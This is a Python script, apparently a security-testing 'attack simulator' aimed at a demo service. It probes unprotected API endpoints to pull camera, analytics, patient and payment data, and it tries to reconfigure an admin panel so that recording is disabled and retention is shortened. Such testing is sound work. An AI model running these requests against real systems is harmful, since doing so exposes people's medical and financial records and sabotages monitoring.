#!/usr/bin/env python3
"""
Data Exfiltration Attack Simulator
Attempts to extract sensitive data from services
"""

import requests
import json
import time
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DataExfiltrationSimulator:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def extract_cameras(self):
        """Attempt to extract camera data"""
        logger.info("🎯 [Attack 1] Extracting camera data...")
        try:
            response = self.session.get(f"{self.base_url}/api/cameras", timeout=5)
            if response.status_code == 200:
                logger.info("   ✅ SUCCESS: Retrieved camera data")
                logger.info(f"   📋 Cameras: {response.json()}")
                return True
        except Exception as e:
            logger.error(f"   ❌ Failed: {e}")
        return False
    
    def extract_analytics(self):
        """Attempt to extract sensitive analytics"""
        logger.info("🎯 [Attack 2] Extracting traffic analytics...")
        try:
            response = self.session.get(f"{self.base_url}/api/analytics", timeout=5)
            if response.status_code == 200:
                logger.info("   ✅ SUCCESS: Retrieved analytics data")
                logger.info(f"   📊 Analytics: {response.json()}")
                return True
        except Exception as e:
            logger.error(f"   ❌ Failed: {e}")
        return False
    
    def modify_admin_config(self):
        """Attempt to modify admin configuration"""
        logger.info("🎯 [Attack 3] Attempting to modify admin config...")
        try:
            payload = {
                "recording_enabled": False,
                "alert_threshold": 0.1,
                "retention_days": 1
            }
            response = self.session.put(
                f"{self.base_url}/admin/config",
                json=payload,
                timeout=5
            )
            if response.status_code == 200:
                logger.info("   ✅ SUCCESS: Modified admin configuration!")
                logger.info(f"   ⚠️  Config: {response.json()}")
                return True
        except Exception as e:
            logger.error(f"   ❌ Failed: {e}")
        return False
    
    def extract_healthcare_patients(self):
        """Attempt to extract patient data (HIPAA violation)"""
        logger.info("🎯 [Attack 4] Extracting patient data (HIPAA violation)...")
        try:
            response = self.session.get(
                f"{self.base_url}/api/patients",
                timeout=5
            )
            if response.status_code == 200:
                logger.info("   ✅ SUCCESS: Retrieved SENSITIVE patient data!")
                data = response.json()
                logger.info(f"   🏥 Patients: {json.dumps(data, indent=2)}")
                return True
        except Exception as e:
            logger.error(f"   ❌ Failed: {e}")
        return False
    
    def extract_transactions(self):
        """Attempt to extract payment transaction data"""
        logger.info("🎯 [Attack 5] Extracting payment transactions...")
        try:
            response = self.session.get(
                f"{self.base_url}/api/transactions",
                timeout=5
            )
            if response.status_code == 200:
                logger.info("   ✅ SUCCESS: Retrieved SENSITIVE payment data!")
                logger.info(f"   💳 Transactions: {response.json()}")
                return True
        except Exception as e:
            logger.error(f"   ❌ Failed: {e}")
        return False
    
    def run_all_attacks(self):
        """Run all data exfiltration attacks"""
        logger.info("")
        logger.info("====== DATA EXFILTRATION ATTACK ======")
        logger.info(f"Target: {self.base_url}")
        logger.info("=====================================")
        logger.info("")
        
        results = {
            "Camera Extraction": self.extract_cameras(),
            "Analytics Extraction": self.extract_analytics(),
            "Admin Config Modification": self.modify_admin_config(),
            "Patient Data Exfiltration": self.extract_healthcare_patients(),
            "Payment Data Exfiltration": self.extract_transactions(),
        }
        
        logger.info("")
        logger.info("====== ATTACK RESULTS ======")
        successful = sum(1 for v in results.values() if v)
        logger.info(f"Successful attacks: {successful}/{len(results)}")
        
        for attack_name, success in results.items():
            status = "✅ SUCCESS" if success else "❌ FAILED"
            logger.info(f"  {status}: {attack_name}")
        
        logger.info("")


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python data_exfiltration.py <service_url>")
        print("Example: python data_exfiltration.py http://localhost:8001")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip('/')
    
    simulator = DataExfiltrationSimulator(base_url)
    simulator.run_all_attacks()
